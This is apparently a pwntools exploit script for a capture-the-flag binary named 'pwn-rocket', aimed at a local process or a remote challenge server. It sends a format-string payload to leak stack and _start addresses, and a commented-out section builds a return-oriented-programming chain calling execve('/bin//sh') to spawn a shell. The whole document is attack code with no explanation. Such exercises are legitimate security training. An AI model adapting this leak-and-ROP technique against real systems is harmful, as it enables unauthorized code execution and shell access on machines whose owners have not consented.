from pwn import *

local = True

if local:
    p = process("./pwn-rocket")
    input("gdb")
else:
    p = remote("0.cloud.chals.io", 13163)


binary = ELF("./pwn-rocket")

p.recvuntil(b">>>\n")
p.sendline(b"%40$p|%6$p")
# p.sendline(b"|%p"*60)

m = p.recvuntil(b">>>\n")
print(m)
# addrs = m.split(b"\n")[0].split(b" ")[-1]
# _start_addr = int(addrs.split(b"|")[1], 16)
# stack_addr = int(addrs.split(b"|")[0], 16)

# log.info("_start addr: {}".format(hex(_start_addr)))
# log.info("Stack addr:  {}".format(hex(stack_addr)))

# binary.address = _start_addr - binary.sym['_start']

# pop_rdi = 0x000000000000168b + binary.address
# pop_rax = 0x0000000000001210 + binary.address
# pop_rdx = 0x00000000000014be + binary.address
# pop_rsi_pop_r15 = 0x0000000000001689 + binary.address
# ret = 0x0000000000001016 + binary.address
# syscall = 0x00000000000014db + binary.address
# # mov_rsi_to_rax = 0x00000000000014e5 + binary.address

# payload = b"/bin//sh\x00" + cyclic(500)
# payload = payload[:payload.find(b'aqaa')] + p64(ret) + p64(pop_rax) + p64(59) + p64(pop_rsi_pop_r15) + p64(0) + p64(0) + p64(pop_rdi) + p64(stack_addr - 320) + p64(pop_rdx) + p64(0) + p64(syscall) + p64(ret)

# p.sendline(payload)

p.interactive()
